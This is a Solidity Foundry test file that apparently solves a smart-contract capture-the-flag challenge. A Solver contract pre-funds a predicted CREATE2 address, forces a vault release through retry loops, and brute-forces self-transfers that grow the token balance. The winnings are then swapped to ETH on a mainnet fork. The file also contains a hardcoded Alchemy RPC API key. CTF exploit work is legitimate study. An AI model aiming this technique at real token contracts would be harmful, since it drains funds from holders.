// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Challenge.sol";

contract CounterTest is Test {
    Challenge challenge;
    address player = address(0x1111);
    IUniswapV2Router01 internal constant UNISWAPV2_ROUTER =
        IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() public {
        // uint256 mainnetFork = vm.createFork("http://165.227.171.171:8545/TLANXTKoNPfiHejuMbhMwHLC/main");
        uint256 mainnetFork = vm.createFork("https://eth-mainnet.alchemyapi.io/v2/kIP2_euA9T6Z-e5MjHzTzRUmgqCLsHUA");
        vm.selectFork(mainnetFork);
        vm.rollFork(21641964);

        // challenge = new Challenge(player);
        console.log("fork");
        console.log("blockTImestamp:", block.timestamp);
    }

    function test_Increment() public {
        vm.deal(address(this), 10 ether);
        vm.deal(player, 1 ether);
        challenge = new Challenge{value: 10 ether}(player);
        LuckyToken token = challenge.TOKEN();
        console.log("balance: %e", token.balanceOf(player));
        console.log("total MINTED %e", token.totalAmountMinted());
        console.log("total BURNED %e", token.totalAmountBurned());
        vm.startPrank(player);

        // swap uniswap for some token. swap in 90% ether for TOKEN
        uint256 amount = player.balance * 90 / 100;
        console.log("swapAmount: %e", amount);
        address[] memory path = new address[](2);
        path[0] = UNISWAPV2_ROUTER.WETH();
        path[1] = address(token);
        UNISWAPV2_ROUTER.swapExactETHForTokens{value: amount}(0, path, player, block.timestamp + 6000);

        console.log("after swap balance: %e", challenge.TOKEN().balanceOf(player));

        Solver solver = new Solver(challenge, player);

        token.approve(address(solver), type(uint256).max);
        console.log("balance: %e", token.balanceOf(player));

        solver.step1();
        token.approve(address(player), type(uint256).max);
        for (uint256 i = 0; i < 15; i++) {
            token.transferFrom(player, player, 1e1);
            skip(11);
        }
        solver.step2(11);

        // --skip-simulation
        solver.solveRepeat(100);
        solver.solveRepeat(100);

        console.log("balance: %e", token.balanceOf(player));
        console.log("balance: %e", token.balanceOf(address(solver)));

        //swap all money to ether
        token.approve(address(UNISWAPV2_ROUTER), type(uint256).max);
        path[0] = address(token);
        path[1] = UNISWAPV2_ROUTER.WETH();

        console.log("balance1: %e", challenge.balance());
        UNISWAPV2_ROUTER.swapExactTokensForTokens(5e20, 0, path, player, block.timestamp + 6000);

        console.log("balance1: %e", challenge.balance());
        console.log("solved", challenge.isSolved());
        vm.stopPrank();
    }
}

contract Solver {
    Challenge challenge;
    LuckyToken token;
    address owner;
    address predict;

    constructor(Challenge _challenge, address _owner) {
        challenge = _challenge;
        token = challenge.TOKEN();
        owner = _owner;
    }

    function step1() public {
        bytes memory dataCreationCode = getBytecode(address(token), 12);
        predict = getAddress(dataCreationCode, address(token.teamVault()), uint256(getSalt(address(this))));
        console.log("predict:           ", predict);
        token.transferFrom(owner, predict, 1e5);
    }

    function step2(uint256 tryCount) public {
        console.log("predict current balance: %e", token.balanceOf(predict));
        require(token.balanceOf(predict) > 0, "non zero balance step1");
        require(token.txCount() > 10, "not ready tx count");
        for (uint256 i = 0; i < tryCount; i++) {
            try this.selfRelease() {
                console.log("step 2 success after %d", i);
                return;
            } catch Error(string memory reason) {
                console.log("Step2 failed: %s", reason);
                token.transferFrom(owner, owner, 1e5); // moving nonce needle
            }
        }

        // console.log("lockStakingAddress %e", address(token.teamVault().lockStaking()));
        // console.log("lockstaking current balance: %e", token.balanceOf(address(token.teamVault().lockStaking())));
        // require(token.balanceOf(address(token.teamVault().lockStaking())) > 0, "non zero balance step1");
        // console.log("total BURNED %e", token.totalAmountBurned());
    }

    function trySolve(uint256 times) public returns (bool) {
        uint256 amount0 = token.balanceOf(owner);
        uint256 amount1 = token.balanceOf(address(this));
        bool fromOwner = amount0 > amount1;
        uint256 amount = fromOwner ? amount0 : amount1;

        for (uint256 i = 0; i < times; i++) {
            uint256 newAmount = amount - i;

            try this.selfTransfer(newAmount) {
                return true;
            } catch Error(string memory reason) {
                // console.log("Error: %s", reason);
            }
        }
        return false;
    }

    function selfTransfer(uint256 amount) public {
        uint256 beforeBalance = token.balanceOf(owner);
        token.transferFrom(owner, owner, amount);
        uint256 afterBalance = token.balanceOf(owner);
        require(afterBalance > beforeBalance, "lost money");
    }

    function selfRelease() public {
        token.teamVault().release();
        require(token.totalAmountBurned() > 1e22, "not burned");
    }

    function solveRepeat(uint256 count) public {
        for (uint256 i = 0; i < count; i++) {
            trySolve(10);
        }
    }

    function withdraw() public {
        token.transfer(owner, token.balanceOf(address(this)));
    }

    function _calculateNonce(address _s1, address _s2, uint256 _s3, uint256 _s4, uint256 _s5, bytes32 _s6)
        public
        pure
        returns (uint256)
    {
        return uint256(keccak256(abi.encodePacked(_s1, _s2, _s3, _s4, _s5, _s6)));
    }

    // 1. Get bytecode of contract to be deployed
    // NOTE: _owner and _foo are arguments of the TestContract's constructor
    function getBytecode(address _owner, uint256 _foo) public pure returns (bytes memory) {
        bytes memory bytecode = type(LockStaking).creationCode;

        return abi.encodePacked(bytecode, abi.encode(_owner, _foo));
    }
    // 2. Compute the address of the contract to be deployed
    // NOTE: _salt is a random number used to create an address

    function getAddress(bytes memory bytecode, address from, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), from, _salt, keccak256(bytecode)));

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }

    function getSalt(address from) internal view returns (bytes32) {
        return bytes32(uint256(uint160(from)));
    }
}
